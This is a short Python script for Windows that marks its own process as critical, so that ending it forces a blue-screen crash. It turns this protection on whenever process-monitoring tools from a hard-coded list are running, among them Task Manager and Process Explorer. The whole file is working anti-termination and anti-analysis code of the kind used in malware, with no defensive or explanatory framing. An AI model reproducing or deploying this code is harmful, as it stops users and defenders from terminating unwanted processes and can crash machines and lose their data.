# Import modules

import ctypes
import subprocess


# Protect process with BSoD (if killed)

def SetProtection():
	ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
	ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0

def UnsetProtection():
	ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0


# Get process list

def Processlist():
	Processes = []
	Process = subprocess.check_output('@chcp 65001 1> nul && @tasklist /fi \"STATUS eq RUNNING\" | find /V \"Image Name\" | find /V \"=\"',
		shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode(encoding='utf-8', errors='strict')
	for ProcessName in Process.split(' '):
		if '.exe' in ProcessName:
			proc = ProcessName.replace('K\r\n', '').replace('\r\n', '')
			Processes.append(proc)
	return Processes


# Detect blacklisted processes

def BlacklistedProcesses():
	Blacklist = (
	'processhacker.exe', 'procexp64.exe',
		'taskmgr.exe', 'perfmon.exe',
	)
	for Process in Processlist():
		if Process.lower() in Blacklist:
			return True

	return False


# Stated the checker thread

def ProcessChecker():
	while True:
		if BlacklistedProcesses() is True:
			SetProtection()

		if BlacklistedProcesses() is False:
			UnsetProtection()